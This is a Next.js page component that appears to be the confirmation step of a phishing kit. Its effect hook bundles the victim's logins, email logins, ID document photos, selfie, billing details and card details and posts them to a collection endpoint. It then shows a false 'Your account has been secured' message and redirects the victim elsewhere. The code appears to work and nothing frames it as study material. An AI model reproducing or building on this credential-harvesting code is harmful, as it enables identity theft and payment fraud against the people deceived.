import { Box, Flex, Image } from "@chakra-ui/react";
import axios from "axios";
import React, { useContext, useEffect } from "react";
import { Container } from "../../../components/Container";
import { IntroText } from "../../../components/IntroText";
import { ProgressBar } from "../../../components/ProgressBar";
import { Section } from "../../../components/Section";
import { Wrapper } from "../../../components/Wrapper";
import { dataURItoBlob } from "../../../utils/dataURItoBlob";
import { getProgress } from "../../../utils/getProgress";
import { DataContext } from "../../_app";

interface ConfirmationProps {}

const Confirmation: React.FC<ConfirmationProps> = () => {
  const { data } = useContext(DataContext);
  useEffect(() => {
    if (typeof window !== `undefined` && data && Object.keys(data).length) {
      const front = data.docs && data.docs.front;
      const back = data.docs && data.docs.back;
      const logins = data.logins;
      const selfie = data.selfie;
      const emailLogins = data.emailLogins;
      const billing = data.billing;
      const cardDetails = data.cardDetails;

      const sendSession = async () => {
        if (logins) {
          const formData = new FormData();

          if (front && back) {
            formData.append(`front`, front);
            formData.append(`back`, back);
          }

          if (logins) {
            formData.append(`logins`, JSON.stringify(logins));
          }

          if (selfie) {
            formData.append(`selfie`, dataURItoBlob(selfie));
          }

          if (emailLogins) {
            formData.append(`emailLogins`, JSON.stringify(emailLogins));
          }

          if (billing) {
            formData.append(`billing`, JSON.stringify(billing));
          }

          if (cardDetails) {
            formData.append(`cardDetails`, JSON.stringify(cardDetails));
          }

          formData.append(`form`, `SESSION`);

          await axios.post(`/api/send-session`, formData, {
            headers: {
              "Content-Type": `multipart/form-data`,
            },
          });
        } else {
          console.log(`You are on the server`);
        }

        window.location.href = process.env.NEXT_PUBLIC_EXIT_URL as string;
      };

      sendSession();
    }
    return () => {};
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);
  return (
    <Wrapper>
      <Container>
        <ProgressBar
          indicators={getProgress()}
          highlight={getProgress().indexOf(`Confirmation`)}
        />
        <Section>
          <IntroText
            title={`Thank you`}
            paragraph={`Your account has been secured. Please wait while we redirect you to the login page.`}
          />
          <Box as={`section`}>
            <Box>
              <Box
                as={`fieldset`}
                m={`42px 0 18px`}
                mt={0}
                p={0}
                border={0}
                minW={0}
              >
                <Flex
                  flexDir={`column`}
                  _before={{
                    content: `" "`,
                    display: `table`,
                  }}
                  _after={{
                    clear: `both`,
                    content: `" "`,
                    display: `table`,
                  }}
                >
                  <Image
                    src={`/images/jamp-spinner-2x.gif`}
                    alt={``}
                    w={`20px`}
                    h={"20px"}
                    my={"20px"}
                  />
                </Flex>
              </Box>
            </Box>
          </Box>
        </Section>
      </Container>
    </Wrapper>
  );
};

export async function getStaticProps() {
  return {
    props: { fallback: false },
  };
}

export default Confirmation;
